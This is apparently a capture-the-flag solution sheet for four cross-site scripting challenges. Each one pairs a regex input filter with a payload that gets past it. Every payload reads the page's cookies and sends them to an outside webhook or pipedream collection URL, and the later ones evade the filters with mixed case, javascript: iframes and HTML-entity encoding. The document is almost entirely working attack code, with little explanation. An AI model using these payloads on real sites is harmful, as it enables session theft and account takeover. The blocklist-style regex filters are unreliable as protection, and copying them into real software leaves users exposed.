XSS 1
```
<script>new Image().src='https://eoe3lnhzk1vx91.m.pipedream.net?c=' + encodeURIComponent(document.cookie);</script>
```

XSS 2

Bypass
```
def filter_2(payload):
    regex = ".*(script|(</.*>)).*"
    if re.match(regex, payload):
return "Nope"
    return payload
```

```
<img src=x onerror=this.src='https://eoe3lnhzk1vx91.m.pipedream.net?c='+encodeURIComponent(document.cookie)>
```

XSS 3

Bypass the following

```
def filter_3(payload):
    regex = ".*(://|script|(</.*>)|(on\w+\s*=)).*"
    if re.match(regex, payload):
return "Nope"
    return payload
```

```
<iframe src=jaVaSCrIPt:location='//webhook.site/43201095-fd61-4dda-b348-2f7ee9789cb7/?c='+document.cookie>
```


XSS 4
```
def filter_4(payload):
    regex = "(?i:(.*(/|script|(</.*>)|document|cookie|eval|string|(\"|'|`).*(('.+')|(\".+\")|(`.+`)).*(\"|'|`)).*))|(on\w+\s*=)|\+|!"
    if re.match(regex, payload):
return "Nope"
    return payload
```

```
<iframe srcdoc=&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;location=&#39;&#47;&#47;webhook.site&#47;43201095-fd61-4dda-b348-2f7ee9789cb7&#47;?c=&#39;.concat(window[&#39;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#39;][&#39;&#99;&#111;&#111;&#107;&#105;&#101;&#39;])&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;>
```